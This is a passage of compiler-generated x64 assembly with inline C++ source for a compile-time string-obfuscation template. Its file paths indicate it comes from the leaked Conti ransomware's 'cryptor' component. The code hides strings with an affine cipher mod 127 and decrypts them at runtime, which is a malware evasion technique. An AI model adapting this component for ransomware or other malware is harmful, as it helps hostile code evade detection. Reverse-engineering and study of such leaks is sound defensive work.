  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 67		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 55 00 00 00	 mov	 eax, 85			; 00000055H
  0002d	2b c1		 sub	 eax, ecx
  0002f	8d 0c 80	 lea	 ecx, DWORD PTR [rax+rax*4]

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00037	c1 e1 03	 shl	 ecx, 3

; 40   :     return (a % n + n) % n;

  0003a	f7 e9		 imul	 ecx
  0003c	03 d1		 add	 edx, ecx
  0003e	c1 fa 06	 sar	 edx, 6
  00041	8b c2		 mov	 eax, edx
  00043	c1 e8 1f	 shr	 eax, 31
  00046	03 d0		 add	 edx, eax
  00048	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004b	2b c8		 sub	 ecx, eax
  0004d	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00052	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00055	f7 e9		 imul	 ecx
  00057	03 d1		 add	 edx, ecx
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00068	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  0006c	49 83 ea 01	 sub	 r10, 1
  00070	75 ae		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00072	49 8b c0	 mov	 rax, r8
  00075	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EJ@$0FF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<73,85,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0EJ@$0FF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0EJ@$0FF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<73,85,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<73,85,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 0e	 mov	 BYTE PTR [rcx+1], 14
  00007	c6 41 02 55	 mov	 BYTE PTR [rcx+2], 85	; 00000055H
  0000b	c6 41 03 5c	 mov	 BYTE PTR [rcx+3], 92	; 0000005cH
  0000f	c6 41 04 55	 mov	 BYTE PTR [rcx+4], 85	; 00000055H
  00013	c6 41 05 52	 mov	 BYTE PTR [rcx+5], 82	; 00000052H
  00017	c6 41 06 55	 mov	 BYTE PTR [rcx+6], 85	; 00000055H
  0001b	c6 41 07 5c	 mov	 BYTE PTR [rcx+7], 92	; 0000005cH
  0001f	c6 41 08 55	 mov	 BYTE PTR [rcx+8], 85	; 00000055H
  00023	c6 41 09 55	 mov	 BYTE PTR [rcx+9], 85	; 00000055H
  00027	c6 41 0a 55	 mov	 BYTE PTR [rcx+10], 85	; 00000055H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0EJ@$0FF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<73,85,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<73,85,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BD@$0HG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0BD@$0HG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<19,118,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 67		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 12 00 00
	00		 mov	 r10d, 18
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 76 00 00 00	 mov	 eax, 118		; 00000076H
  0002d	2b c1		 sub	 eax, ecx
  0002f	8d 0c 80	 lea	 ecx, DWORD PTR [rax+rax*4]

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00037	c1 e1 02	 shl	 ecx, 2

; 40   :     return (a % n + n) % n;

  0003a	f7 e9		 imul	 ecx
  0003c	03 d1		 add	 edx, ecx
  0003e	c1 fa 06	 sar	 edx, 6
  00041	8b c2		 mov	 eax, edx
  00043	c1 e8 1f	 shr	 eax, 31
  00046	03 d0		 add	 edx, eax
  00048	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004b	2b c8		 sub	 ecx, eax
  0004d	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00052	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00055	f7 e9		 imul	 ecx
  00057	03 d1		 add	 edx, ecx
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00068	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  0006c	49 83 ea 01	 sub	 r10, 1
  00070	75 ae		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00072	49 8b c0	 mov	 rax, r8
  00075	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BD@$0HG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<19,118,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BD@$0HG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0BD@$0HG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<19,118,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::MetaBuffer<19,118,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 57	 mov	 BYTE PTR [rcx+1], 87	; 00000057H
  00007	c6 41 02 76	 mov	 BYTE PTR [rcx+2], 118	; 00000076H
  0000b	c6 41 03 05	 mov	 BYTE PTR [rcx+3], 5
  0000f	c6 41 04 76	 mov	 BYTE PTR [rcx+4], 118	; 00000076H
  00013	c6 41 05 7d	 mov	 BYTE PTR [rcx+5], 125	; 0000007dH
  00017	c6 41 06 76	 mov	 BYTE PTR [rcx+6], 118	; 00000076H
  0001b	c6 41 07 18	 mov	 BYTE PTR [rcx+7], 24
  0001f	c6 41 08 76	 mov	 BYTE PTR [rcx+8], 118	; 00000076H
  00023	c6 41 09 0b	 mov	 BYTE PTR [rcx+9], 11
  00027	c6 41 0a 76	 mov	 BYTE PTR [rcx+10], 118	; 00000076H
  0002b	c6 41 0b 44	 mov	 BYTE PTR [rcx+11], 68	; 00000044H
  0002f	c6 41 0c 76	 mov	 BYTE PTR [rcx+12], 118	; 00000076H
  00033	c6 41 0d 2b	 mov	 BYTE PTR [rcx+13], 43	; 0000002bH
  00037	c6 41 0e 76	 mov	 BYTE PTR [rcx+14], 118	; 00000076H
  0003b	c6 41 0f 11	 mov	 BYTE PTR [rcx+15], 17
  0003f	c6 41 10 76	 mov	 BYTE PTR [rcx+16], 118	; 00000076H
  00043	c6 41 11 76	 mov	 BYTE PTR [rcx+17], 118	; 00000076H
  00047	c6 41 12 76	 mov	 BYTE PTR [rcx+18], 118	; 00000076H
  0004b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0004f	48 8b c1	 mov	 rax, rcx
  00052	c3		 ret	 0
??0?$MetaBuffer@$0BD@$0HG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<19,118,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::MetaBuffer<19,118,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0L@$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0L@$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<11,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 18 00 00
	00		 mov	 r10d, 24
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 0b 00 00 00	 mov	 eax, 11
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 17	 imul	 ecx, eax, 23

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0L@$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<11,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0L@$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0L@$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<11,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::MetaBuffer<11,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 2e	 mov	 BYTE PTR [rcx+1], 46	; 0000002eH
  00007	c6 41 02 0b	 mov	 BYTE PTR [rcx+2], 11
  0000b	c6 41 03 7a	 mov	 BYTE PTR [rcx+3], 122	; 0000007aH
  0000f	c6 41 04 0b	 mov	 BYTE PTR [rcx+4], 11
  00013	c6 41 05 6a	 mov	 BYTE PTR [rcx+5], 106	; 0000006aH
  00017	c6 41 06 0b	 mov	 BYTE PTR [rcx+6], 11
  0001b	c6 41 07 4e	 mov	 BYTE PTR [rcx+7], 78	; 0000004eH
  0001f	c6 41 08 0b	 mov	 BYTE PTR [rcx+8], 11
  00023	c6 41 09 5f	 mov	 BYTE PTR [rcx+9], 95	; 0000005fH
  00027	c6 41 0a 0b	 mov	 BYTE PTR [rcx+10], 11
  0002b	c6 41 0b 6d	 mov	 BYTE PTR [rcx+11], 109	; 0000006dH
  0002f	c6 41 0c 0b	 mov	 BYTE PTR [rcx+12], 11
  00033	c6 41 0d 60	 mov	 BYTE PTR [rcx+13], 96	; 00000060H
  00037	c6 41 0e 0b	 mov	 BYTE PTR [rcx+14], 11
  0003b	c6 41 0f 17	 mov	 BYTE PTR [rcx+15], 23
  0003f	c6 41 10 0b	 mov	 BYTE PTR [rcx+16], 11
  00043	c6 41 11 54	 mov	 BYTE PTR [rcx+17], 84	; 00000054H
  00047	c6 41 12 0b	 mov	 BYTE PTR [rcx+18], 11
  0004b	c6 41 13 7a	 mov	 BYTE PTR [rcx+19], 122	; 0000007aH
  0004f	c6 41 14 0b	 mov	 BYTE PTR [rcx+20], 11
  00053	c6 41 15 59	 mov	 BYTE PTR [rcx+21], 89	; 00000059H
  00057	c6 41 16 0b	 mov	 BYTE PTR [rcx+22], 11
  0005b	c6 41 17 0b	 mov	 BYTE PTR [rcx+23], 11
  0005f	c6 41 18 0b	 mov	 BYTE PTR [rcx+24], 11
  00063	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00067	48 8b c1	 mov	 rax, rcx
  0006a	c3		 ret	 0
??0?$MetaBuffer@$0L@$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<11,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::MetaBuffer<11,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CF@$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0CF@$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<37,100,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 67		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 10 00 00
	00		 mov	 r10d, 16
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 64 00 00 00	 mov	 eax, 100		; 00000064H
  0002d	2b c1		 sub	 eax, ecx
  0002f	8d 0c 40	 lea	 ecx, DWORD PTR [rax+rax*2]

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00037	c1 e1 03	 shl	 ecx, 3

; 40   :     return (a % n + n) % n;

  0003a	f7 e9		 imul	 ecx
  0003c	03 d1		 add	 edx, ecx
  0003e	c1 fa 06	 sar	 edx, 6
  00041	8b c2		 mov	 eax, edx
  00043	c1 e8 1f	 shr	 eax, 31
  00046	03 d0		 add	 edx, eax
  00048	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004b	2b c8		 sub	 ecx, eax
  0004d	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00052	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00055	f7 e9		 imul	 ecx
  00057	03 d1		 add	 edx, ecx
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00068	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  0006c	49 83 ea 01	 sub	 r10, 1
  00070	75 ae		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00072	49 8b c0	 mov	 rax, r8
  00075	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CF@$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<37,100,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0CF@$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0CF@$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<37,100,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::MetaBuffer<37,100,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 11	 mov	 BYTE PTR [rcx+1], 17
  00007	c6 41 02 64	 mov	 BYTE PTR [rcx+2], 100	; 00000064H
  0000b	c6 41 03 30	 mov	 BYTE PTR [rcx+3], 48	; 00000030H
  0000f	c6 41 04 64	 mov	 BYTE PTR [rcx+4], 100	; 00000064H
  00013	c6 41 05 6a	 mov	 BYTE PTR [rcx+5], 106	; 0000006aH
  00017	c6 41 06 64	 mov	 BYTE PTR [rcx+6], 100	; 00000064H
  0001b	c6 41 07 75	 mov	 BYTE PTR [rcx+7], 117	; 00000075H
  0001f	c6 41 08 64	 mov	 BYTE PTR [rcx+8], 100	; 00000064H
  00023	c6 41 09 10	 mov	 BYTE PTR [rcx+9], 16
  00027	c6 41 0a 64	 mov	 BYTE PTR [rcx+10], 100	; 00000064H
  0002b	c6 41 0b 3a	 mov	 BYTE PTR [rcx+11], 58	; 0000003aH
  0002f	c6 41 0c 64	 mov	 BYTE PTR [rcx+12], 100	; 00000064H
  00033	c6 41 0d 25	 mov	 BYTE PTR [rcx+13], 37	; 00000025H
  00037	c6 41 0e 64	 mov	 BYTE PTR [rcx+14], 100	; 00000064H
  0003b	c6 41 0f 64	 mov	 BYTE PTR [rcx+15], 100	; 00000064H
  0003f	c6 41 10 64	 mov	 BYTE PTR [rcx+16], 100	; 00000064H
  00043	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00047	48 8b c1	 mov	 rax, rcx
  0004a	c3		 ret	 0
??0?$MetaBuffer@$0CF@$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<37,100,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::MetaBuffer<37,100,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
